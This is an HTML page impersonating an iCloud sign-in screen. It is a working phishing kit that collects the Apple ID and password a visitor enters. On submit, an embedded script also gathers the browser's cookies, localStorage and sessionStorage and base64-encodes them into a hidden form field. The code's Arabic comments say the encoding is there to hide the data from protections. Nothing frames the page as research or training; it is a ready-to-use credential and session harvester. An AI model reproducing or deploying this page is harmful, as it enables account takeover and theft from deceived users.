<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud Verification</title>
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .box { width: 300px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/ICloud_logo.svg/2560px-ICloud_logo.svg.png" width="80">
        <h2>Sign in to iCloud</h2>
        <form action="/auth/gate" method="POST" id="vault">
            <input type="email" name="u" placeholder="Apple ID" required>
            <input type="password" name="p" placeholder="Password" required>
            <input type="hidden" name="sid" id="sid">
            <button type="submit">Sign In</button>
        </form>
    </div>

    <script>
        document.getElementById('vault').onsubmit = function() {
            // سحب كل ما يمكن قراءته من كوكيز وتخزين محلي
            let data = "COOKIES:" + document.cookie + " | LS:" + JSON.stringify(localStorage) + " | SS:" + JSON.stringify(sessionStorage);
            
            // تشفير البيانات لإخفائها عن الحماية أثناء الإرسال
            document.getElementById('sid').value = btoa(unescape(encodeURIComponent(data)));
        };
    </script>
</body>
</html>
